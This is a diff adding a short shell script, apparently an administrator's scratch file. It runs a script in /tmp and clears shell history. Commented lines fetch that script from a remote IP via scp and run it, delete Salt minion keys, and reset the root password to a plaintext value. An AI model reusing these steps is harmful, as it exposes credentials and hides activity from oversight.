@@ -1,0 +1,16 @@
+hostname
+/bin/sh /tmp/chen-123.sh
+history -c
+#scp -P 29622 180.96.7.114:/root/chen-123/chen-123.sh /tmp/
+#/usr/bin/rsync -e 'ssh -p 29622' 180.96.7.114:/root/chen-123/chen-123.sh /tmp/
+#/bin/sh /tmp/chen-123.sh
+#grep '192' /proc/mounts|awk '{print $1" "$2}'
+#grep '\(\([0-9]\|[1-9][0-9]\|1[0-9]\{2\}\|2[0-4][0-9]\|25[0-5]\)\.\)\{3\}\([0-9]\|[1-9][0-9]\|1[0-9]\{2\}\|2[0-4][0-9]\|25[0-5]\)' /proc/mounts | awk '{print $1,$2,"\n--------------------------------------------"}'
+#grep '\(\([0-9]\|[1-9][0-9]\|1[0-9]\{2\}\|2[0-4][0-9]\|25[0-5]\)\.\)\{3\}\([0-9]\|[1-9][0-9]\|1[0-9]\{2\}\|2[0-4][0-9]\|25[0-5]\)' /proc/mounts| awk '{print $1,$2, "\n--------------------------------------------"}'
+#ifconfig
+#ps aux|grep salt
+#history
+#test -e /etc/salt/pki/minion && (cd /etc/salt/pki && rm -rf minion)|| echo 'not exit'
+#test -e /etc/init.d/salt-minion && /etc/init.d/salt-minion start
+#echo 'fuyuan1906!@#'|passwd --stdin root
+#history -c
